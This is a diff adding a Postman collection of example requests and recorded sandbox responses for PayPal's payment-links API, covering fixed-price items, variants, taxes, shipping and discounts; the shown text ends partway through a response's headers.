@@ -1,0 +1,2455 @@
+{
+  "info": {
+    "_postman_id": "b6743992-a422-4c45-89fe-c2bda062bfd9",
+    "name": "Payment Links and Buttons",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+    "_exporter_id": "30269281",
+    "_collection_link": "https://go.postman.co/collection/43216670-b6743992-a422-4c45-89fe-c2bda062bfd9?source=collection_link"
+  },
+  "item": [
+    {
+      "name": "Creates a payment resource for a single-item purchase",
+      "event": [
+        {
+          "listen": "prerequest",
+          "script": {
+            "exec": [
+              ""
+            ],
+            "type": "text/javascript",
+            "packages": {},
+            "requests": {}
+          }
+        },
+        {
+          "listen": "test",
+          "script": {
+            "exec": [
+              ""
+            ],
+            "type": "text/javascript",
+            "packages": {},
+            "requests": {}
+          }
+        }
+      ],
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "PayPal-Request-Id",
+            "value": "{{$guid}}"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n    \"type\": \"BUY_NOW\",\n    \"integration_mode\": \"LINK\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://merchant.example.com/thank-you\",\n    \"line_items\": [\n        {\n            \"name\": \"Wireless Mouse\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"39.99\"\n            }\n        }\n    ]\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "{{base_url}}/v1/checkout/payment-resources",
+          "host": [
+            "{{base_url}}"
+          ],
+          "path": [
+            "v1",
+            "checkout",
+            "payment-resources"
+          ]
+        }
+      },
+      "response": [
+        {
+          "name": "201 - Create fixed price payment link with return URL",
+          "originalRequest": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "PayPal-Request-Id",
+                "value": "{{$guid}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"type\": \"BUY_NOW\",\n    \"integration_mode\": \"LINK\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://merchant.example.com/thank-you\",\n    \"line_items\": [\n        {\n            \"name\": \"Wireless Mouse\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"39.99\"\n            }\n        }\n    ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ]
+            }
+          },
+          "status": "Created",
+          "code": 201,
+          "_postman_previewlanguage": "json",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "959"
+            },
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f386767c82ba1"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f386767c82ba1-d50e5432a4c5764a-01\""
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 28 Jan 2026 19:47:24 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc1000121-SJC, cache-phx1710116-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1769629644.401593,VS0,VE389"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"id\": \"PLB-Y2ULCAZ2KF4B\",\n    \"integration_mode\": \"LINK\",\n    \"type\": \"BUY_NOW\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://merchant.example.com/thank-you\",\n    \"line_items\": [\n        {\n            \"name\": \"Wireless Mouse\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"39.99\"\n            },\n            \"collect_shipping_address\": false\n        }\n    ],\n    \"status\": \"ACTIVE\",\n    \"create_time\": \"2026-01-28T19:47:24Z\",\n    \"update_time\": \"2026-01-28T19:47:24Z\",\n    \"links\": [\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-Y2ULCAZ2KF4B\",\n            \"rel\": \"self\",\n            \"method\": \"GET\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-Y2ULCAZ2KF4B\",\n            \"rel\": \"replace\",\n            \"method\": \"PUT\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-Y2ULCAZ2KF4B\",\n            \"rel\": \"edit\",\n            \"method\": \"PATCH\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-Y2ULCAZ2KF4B\",\n            \"rel\": \"delete\",\n            \"method\": \"DELETE\"\n        },\n        {\n            \"href\": \"https://www.sandbox.paypal.com/ncp/payment/PLB-Y2ULCAZ2KF4B\",\n            \"rel\": \"payment_link\",\n            \"method\": \"GET\"\n        }\n    ]\n}"
+        },
+        {
+          "name": "201 - Create payment link with dimensions of variants",
+          "originalRequest": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "PayPal-Request-Id",
+                "value": "{{$guid}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"type\": \"BUY_NOW\",\n    \"integration_mode\": \"LINK\",\n    \"reusable\": \"MULTIPLE\",\n    \"line_items\": [\n        {\n            \"name\": \"T-Shirt\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"20.00\"\n            },\n            \"variants\": {\n                \"dimensions\": [\n                    {\n                        \"name\": \"Color\",\n                        \"primary\": true,\n                        \"options\": [\n                            {\n                                \"label\": \"White\"\n                            },\n                            {\n                                \"label\": \"Black\"\n                            }\n                        ]\n                    },\n                    {\n                        \"name\": \"Size\",\n                        \"primary\": false,\n                        \"options\": [\n                            {\n                                \"label\": \"11oz\"\n                            },\n                            {\n                                \"label\": \"15oz\"\n                            }\n                        ]\n                    }\n                ]\n            }\n        }\n    ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ]
+            }
+          },
+          "status": "Created",
+          "code": 201,
+          "_postman_previewlanguage": "json",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "1084"
+            },
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f169814d7cd16"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f169814d7cd16-601838df56fb00e8-01\""
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 28 Jan 2026 19:48:45 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc10038-SJC, cache-phx1710061-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1769629725.994421,VS0,VE390"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"id\": \"PLB-YU8NTHJRLUMR\",\n    \"integration_mode\": \"LINK\",\n    \"type\": \"BUY_NOW\",\n    \"reusable\": \"MULTIPLE\",\n    \"line_items\": [\n        {\n            \"name\": \"T-Shirt\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"20.00\"\n            },\n            \"collect_shipping_address\": false,\n            \"variants\": {\n                \"dimensions\": [\n                    {\n                        \"name\": \"Color\",\n                        \"primary\": true,\n                        \"options\": [\n                            {\n                                \"label\": \"White\"\n                            },\n                            {\n                                \"label\": \"Black\"\n                            }\n                        ]\n                    },\n                    {\n                        \"name\": \"Size\",\n                        \"primary\": false,\n                        \"options\": [\n                            {\n                                \"label\": \"11oz\"\n                            },\n                            {\n                                \"label\": \"15oz\"\n                            }\n                        ]\n                    }\n                ]\n            }\n        }\n    ],\n    \"status\": \"ACTIVE\",\n    \"create_time\": \"2026-01-28T19:48:45Z\",\n    \"update_time\": \"2026-01-28T19:48:45Z\",\n    \"links\": [\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-YU8NTHJRLUMR\",\n            \"rel\": \"self\",\n            \"method\": \"GET\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-YU8NTHJRLUMR\",\n            \"rel\": \"replace\",\n            \"method\": \"PUT\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-YU8NTHJRLUMR\",\n            \"rel\": \"edit\",\n            \"method\": \"PATCH\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-YU8NTHJRLUMR\",\n            \"rel\": \"delete\",\n            \"method\": \"DELETE\"\n        },\n        {\n            \"href\": \"https://www.sandbox.paypal.com/ncp/payment/PLB-YU8NTHJRLUMR\",\n            \"rel\": \"payment_link\",\n            \"method\": \"GET\"\n        }\n    ]\n}"
+        },
+        {
+          "name": "201 - Create fixed price payment link with variant level price",
+          "originalRequest": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "PayPal-Request-Id",
+                "value": "{{$guid}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"integration_mode\": \"LINK\",\n    \"type\": \"BUY_NOW\",\n    \"reusable\": \"MULTIPLE\",\n    \"line_items\": [\n        {\n            \"name\": \"T-Shirt\",\n            \"variants\": {\n                \"dimensions\": [\n                    {\n                        \"name\": \"Color\",\n                        \"primary\": true,\n                        \"options\": [\n                            {\n                                \"label\": \"White\",\n                                \"unit_amount\": {\n                                    \"currency_code\": \"USD\",\n                                    \"value\": \"19.00\"\n                                }\n                            },\n                            {\n                                \"label\": \"Black\",\n                                \"unit_amount\": {\n                                    \"currency_code\": \"USD\",\n                                    \"value\": \"20.00\"\n                                }\n                            }\n                        ]\n                    },\n                    {\n                        \"name\": \"Size\",\n                        \"primary\": false,\n                        \"options\": [\n                            {\n                                \"label\": \"11oz\"\n                            },\n                            {\n                                \"label\": \"15oz\"\n                            }\n                        ]\n                    }\n                ]\n            }\n        }\n    ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ]
+            }
+          },
+          "status": "Created",
+          "code": 201,
+          "_postman_previewlanguage": "json",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "1138"
+            },
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f9156654642aa"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f9156654642aa-d9ad79c28146c05a-01\""
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 28 Jan 2026 19:49:59 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc10020-SJC, cache-phx1710077-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1769629798.294569,VS0,VE785"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"id\": \"PLB-6YT7XMKT6KPP\",\n    \"integration_mode\": \"LINK\",\n    \"type\": \"BUY_NOW\",\n    \"reusable\": \"MULTIPLE\",\n    \"line_items\": [\n        {\n            \"name\": \"T-Shirt\",\n            \"collect_shipping_address\": false,\n            \"variants\": {\n                \"dimensions\": [\n                    {\n                        \"name\": \"Color\",\n                        \"primary\": true,\n                        \"options\": [\n                            {\n                                \"label\": \"White\",\n                                \"unit_amount\": {\n                                    \"currency_code\": \"USD\",\n                                    \"value\": \"19.00\"\n                                }\n                            },\n                            {\n                                \"label\": \"Black\",\n                                \"unit_amount\": {\n                                    \"currency_code\": \"USD\",\n                                    \"value\": \"20.00\"\n                                }\n                            }\n                        ]\n                    },\n                    {\n                        \"name\": \"Size\",\n                        \"primary\": false,\n                        \"options\": [\n                            {\n                                \"label\": \"11oz\"\n                            },\n                            {\n                                \"label\": \"15oz\"\n                            }\n                        ]\n                    }\n                ]\n            }\n        }\n    ],\n    \"status\": \"ACTIVE\",\n    \"create_time\": \"2026-01-28T19:49:58Z\",\n    \"update_time\": \"2026-01-28T19:49:58Z\",\n    \"links\": [\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-6YT7XMKT6KPP\",\n            \"rel\": \"self\",\n            \"method\": \"GET\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-6YT7XMKT6KPP\",\n            \"rel\": \"replace\",\n            \"method\": \"PUT\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-6YT7XMKT6KPP\",\n            \"rel\": \"edit\",\n            \"method\": \"PATCH\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-6YT7XMKT6KPP\",\n            \"rel\": \"delete\",\n            \"method\": \"DELETE\"\n        },\n        {\n            \"href\": \"https://www.sandbox.paypal.com/ncp/payment/PLB-6YT7XMKT6KPP\",\n            \"rel\": \"payment_link\",\n            \"method\": \"GET\"\n        }\n    ]\n}"
+        },
+        {
+          "name": "201 - Create payment link with taxes & shipping",
+          "originalRequest": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "PayPal-Request-Id",
+                "value": "{{$guid}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"integration_mode\": \"LINK\",\n  \"type\": \"BUY_NOW\",\n  \"reusable\": \"MULTIPLE\",\n  \"return_url\": \"https://merchant.example.com/thank-you\",\n  \"line_items\": [\n    {\n      \"name\": \"Coffee Mug\",\n      \"unit_amount\": {\n        \"currency_code\": \"USD\",\n        \"value\": \"12.00\"\n      },\n      \"taxes\": [\n        {\n          \"name\": \"Sales Tax\",\n          \"type\": \"PREFERENCE\",\n          \"value\": \"PROFILE\"\n        }\n      ],\n      \"shipping\": [\n        {\n          \"type\": \"PREFERENCE\",\n          \"value\": \"PROFILE\"\n        }\n      ]\n    }\n  ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ]
+            }
+          },
+          "status": "Created",
+          "code": 201,
+          "_postman_previewlanguage": "json",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "1077"
+            },
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f1264299b5374"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f1264299b5374-dcac04856f9ad5ce-01\""
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 28 Jan 2026 19:51:12 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc1000147-SJC, cache-phx1710102-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1769629872.417550,VS0,VE367"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"id\": \"PLB-54UPETX9TLK9\",\n    \"integration_mode\": \"LINK\",\n    \"type\": \"BUY_NOW\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://merchant.example.com/thank-you\",\n    \"line_items\": [\n        {\n            \"name\": \"Coffee Mug\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"12.00\"\n            },\n            \"taxes\": [\n                {\n                    \"name\": \"Sales Tax\",\n                    \"type\": \"PREFERENCE\",\n                    \"value\": \"PROFILE\"\n                }\n            ],\n            \"shipping\": [\n                {\n                    \"type\": \"PREFERENCE\",\n                    \"value\": \"PROFILE\"\n                }\n            ],\n            \"collect_shipping_address\": false\n        }\n    ],\n    \"status\": \"ACTIVE\",\n    \"create_time\": \"2026-01-28T19:51:12Z\",\n    \"update_time\": \"2026-01-28T19:51:12Z\",\n    \"links\": [\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-54UPETX9TLK9\",\n            \"rel\": \"self\",\n            \"method\": \"GET\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-54UPETX9TLK9\",\n            \"rel\": \"replace\",\n            \"method\": \"PUT\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-54UPETX9TLK9\",\n            \"rel\": \"edit\",\n            \"method\": \"PATCH\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-54UPETX9TLK9\",\n            \"rel\": \"delete\",\n            \"method\": \"DELETE\"\n        },\n        {\n            \"href\": \"https://www.sandbox.paypal.com/ncp/payment/PLB-54UPETX9TLK9\",\n            \"rel\": \"payment_link\",\n            \"method\": \"GET\"\n        }\n    ]\n}"
+        },
+        {
+          "name": "201 - Create basic payment link",
+          "originalRequest": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "PayPal-Request-Id",
+                "value": "{{$guid}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"type\": \"BUY_NOW\",\n    \"integration_mode\": \"LINK\",\n    \"line_items\": [\n        {\n            \"name\": \"Wireless Mouse\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"39.99\"\n            }\n        }\n    ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ]
+            }
+          },
+          "status": "Created",
+          "code": 201,
+          "_postman_previewlanguage": null,
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "904"
+            },
+            {
+              "key": "server-timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f65093668de31-7ef9082780266007-01\""
+            },
+            {
+              "key": "http_x_pp_az_locator",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "strict-transport-security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "content-type",
+              "value": "application/json"
+            },
+            {
+              "key": "server",
+              "value": "nginx"
+            },
+            {
+              "key": "access-control-expose-headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "cache-control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "paypal-debug-id",
+              "value": "f65093668de31"
+            },
+            {
+              "key": "x-backend-info",
+              "value": "v=1;name=2k1u3gOGb2cebCyZJujTUN--F_ccg18_wju_origin_api_m_2_sandbox_paypal_com;ip=34.106.111.220;port=443;ssl=1;max=200;mr=0;ka_ns=0;ml_ns=0;tka_s=300;tki_s=10;tkp=3;host=api-m.sandbox.paypal.com;min_tls=;max_tls=;sni=edge.sandbox.paypal.com;cert_host=edge.sandbox.paypal.com;ciphers=;check_cert=1;no_reneg=1;to_ns=1000000000;fbto_ns=59000000000;bbto_ns=10000000000;fto_ns=0"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 17 Jun 2026 22:17:40 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc1000141-SJC, cache-sjc1000141-SJC, cache-phx1710038-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1781734660.564526,VS0,VE882"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"id\": \"PLB-LSC7QNHA2NLX\",\n    \"integration_mode\": \"LINK\",\n    \"type\": \"BUY_NOW\",\n    \"reusable\": \"MULTIPLE\",\n    \"line_items\": [\n        {\n            \"name\": \"Wireless Mouse\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"39.99\"\n            },\n            \"collect_shipping_address\": true\n        }\n    ],\n    \"status\": \"ACTIVE\",\n    \"create_time\": \"2026-06-17T22:17:39Z\",\n    \"update_time\": \"2026-06-17T22:17:39Z\",\n    \"links\": [\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-LSC7QNHA2NLX\",\n            \"rel\": \"self\",\n            \"method\": \"GET\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-LSC7QNHA2NLX\",\n            \"rel\": \"replace\",\n            \"method\": \"PUT\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-LSC7QNHA2NLX\",\n            \"rel\": \"edit\",\n            \"method\": \"PATCH\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-LSC7QNHA2NLX\",\n            \"rel\": \"delete\",\n            \"method\": \"DELETE\"\n        },\n        {\n            \"href\": \"https://www.sandbox.paypal.com/ncp/payment/PLB-LSC7QNHA2NLX\",\n            \"rel\": \"payment_link\",\n            \"method\": \"GET\"\n        }\n    ]\n}"
+        },
+        {
+          "name": "201 - Create payment link with taxes, shipping, discounts, handling, customer notes, dimensions of variants, and variant level price",
+          "originalRequest": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "PayPal-Request-Id",
+                "value": "{{$guid}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"type\": \"BUY_NOW\",\n    \"integration_mode\": \"LINK\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://merchant.example.com/thank-you\",\n    \"line_items\": [\n        {\n            \"name\": \"Custom Leather Jacket\",\n            \"description\": \"Premium handcrafted full-grain leather jacket. Available in multiple sizes and colors.\",\n            \"collect_shipping_address\": true,\n            \"taxes\": [\n                {\n                    \"type\": \"PERCENTAGE\",\n                    \"value\": \"8.25\"\n                }\n            ],\n            \"shipping\": [\n                {\n                    \"type\": \"FLAT\",\n                    \"value\": \"12.00\"\n                }\n            ],\n            \"discounts\": [\n                {\n                    \"type\": \"PERCENTAGE\",\n                    \"value\": \"10\"\n                }\n            ],\n            \"handling\": [\n                {\n                    \"value\": \"5.00\"\n                }\n            ],\n            \"customer_notes\": [\n                {\n                    \"label\": \"Engraving text (max 20 characters)\",\n                    \"required\": true\n                },\n                {\n                    \"label\": \"Gift message (optional)\"\n                }\n            ],\n            \"variants\": {\n                \"dimensions\": [\n                    {\n                        \"name\": \"Size\",\n                        \"primary\": true,\n                        \"options\": [\n                            {\n                                \"label\": \"Small\",\n                                \"unit_amount\": {\n                                    \"currency_code\": \"USD\",\n                                    \"value\": \"229.99\"\n                                }\n                            },\n                            {\n                                \"label\": \"Medium\",\n                                \"unit_amount\": {\n                                    \"currency_code\": \"USD\",\n                                    \"value\": \"249.99\"\n                                }\n                            },\n                            {\n                                \"label\": \"Large\",\n                                \"unit_amount\": {\n                                    \"currency_code\": \"USD\",\n                                    \"value\": \"269.99\"\n                                }\n                            }\n                        ]\n                    },\n                    {\n                        \"name\": \"Color\",\n                        \"primary\": false,\n                        \"options\": [\n                            {\n                                \"label\": \"Black\"\n                            },\n                            {\n                                \"label\": \"Brown\"\n                            },\n                            {\n                                \"label\": \"Tan\"\n                            }\n                        ]\n                    }\n                ]\n            },\n            \"adjustable_quantity\": {\n                \"maximum\": 5\n            }\n        }\n    ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ]
+            }
+          },
+          "status": "Created",
+          "code": 201,
+          "_postman_previewlanguage": null,
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "1758"
+            },
+            {
+              "key": "access-control-expose-headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "server-timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f14820291161b-6760a5988f91e211-01\""
+            },
+            {
+              "key": "paypal-debug-id",
+              "value": "f14820291161b"
+            },
+            {
+              "key": "cache-control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "content-type",
+              "value": "application/json"
+            },
+            {
+              "key": "server",
+              "value": "nginx"
+            },
+            {
+              "key": "strict-transport-security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "http_x_pp_az_locator",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "x-backend-info",
+              "value": "v=1;name=2k1u3gOGb2cebCyZJujTUN--F_ccg18_wju_origin_api_m_2_sandbox_paypal_com;ip=34.106.111.220;port=443;ssl=1;max=200;mr=0;ka_ns=0;ml_ns=0;tka_s=300;tki_s=10;tkp=3;host=api-m.sandbox.paypal.com;min_tls=;max_tls=;sni=edge.sandbox.paypal.com;cert_host=edge.sandbox.paypal.com;ciphers=;check_cert=1;no_reneg=1;to_ns=1000000000;fbto_ns=59000000000;bbto_ns=10000000000;fto_ns=0"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 17 Jun 2026 22:18:22 GMT"
+            },
+            {
+              "key": "X-Served-By",
